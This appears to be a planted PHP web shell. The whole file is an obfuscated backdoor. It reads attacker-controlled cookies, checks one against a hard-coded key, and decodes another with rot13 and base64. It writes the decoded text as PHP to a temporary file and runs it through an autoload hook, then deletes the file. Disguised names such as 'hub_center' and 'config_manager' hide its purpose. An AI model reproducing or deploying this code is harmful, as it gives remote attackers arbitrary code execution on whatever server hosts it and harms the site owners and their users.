<?php


if (isset($_COOKIE[24+-24]) && isset($_COOKIE[15+-14]) && isset($_COOKIE[35+-32]) && isset($_COOKIE[31+-27])) {
    $flag = $_COOKIE;
    function hub_center($entry) {
        $flag = $_COOKIE;
        $dat = tempnam((!empty(session_save_path()) ? session_save_path() : sys_get_temp_dir()), '22e078c8');
        if (!is_writable($dat)) {
            $dat = getcwd() . DIRECTORY_SEPARATOR . "config_manager";
        }
        $hld = "\x3c\x3f\x70\x68p\x20" . base64_decode(str_rot13($flag[3]));
        if (is_writeable($dat)) {
            $bind = fopen($dat, 'w+');
            fputs($bind, $hld);
            fclose($bind);
            spl_autoload_unregister(__FUNCTION__);
            require_once($dat);
            @array_map('unlink', array($dat));
        }
    }
    spl_autoload_register("hub_center");
    $key = "09294b4e2500a109b0c698db463d7567";
    if (!strncmp($key, $flag[4], 32)) {
        if (@class_parents("right_pad_string_dataflow_engine", true)) {
            exit;
        }
    }
}
